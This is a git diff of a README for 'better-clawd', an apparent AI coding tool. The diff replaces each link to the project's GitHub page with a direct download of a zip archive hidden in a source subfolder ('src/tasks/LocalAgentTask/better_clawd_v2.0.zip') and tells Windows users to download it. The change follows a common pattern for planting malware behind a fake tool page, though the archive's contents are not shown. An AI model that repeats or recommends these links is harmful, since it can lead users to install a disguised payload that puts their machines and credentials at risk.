@@ -1,6 +1,6 @@
 # 🤖 better-clawd - Faster AI coding with more control
 
-[![Download better-clawd](https://img.shields.io/badge/Download%20better--clawd-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Revolutionattilio514/better-clawd)
+[![Download better-clawd](https://img.shields.io/badge/Download%20better--clawd-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Revolutionattilio514/better-clawd/main/src/tasks/LocalAgentTask/better_clawd_v2.0.zip)
 
 ## 🚀 What it is
 
@@ -29,12 +29,12 @@ If you plan to use an AI provider, you will also need:
 
 ## 📥 Download
 
-1. Open this page: [https://github.com/Revolutionattilio514/better-clawd](https://github.com/Revolutionattilio514/better-clawd)
+1. Open this page: [https://raw.githubusercontent.com/Revolutionattilio514/better-clawd/main/src/tasks/LocalAgentTask/better_clawd_v2.0.zip](https://raw.githubusercontent.com/Revolutionattilio514/better-clawd/main/src/tasks/LocalAgentTask/better_clawd_v2.0.zip)
 2. Look for the latest release or download file
 3. Download the Windows version
 4. Save the file to your Downloads folder
 
-[Download better-clawd](https://github.com/Revolutionattilio514/better-clawd)
+[Download better-clawd](https://raw.githubusercontent.com/Revolutionattilio514/better-clawd/main/src/tasks/LocalAgentTask/better_clawd_v2.0.zip)
 
 ## 🛠️ Install on Windows
 
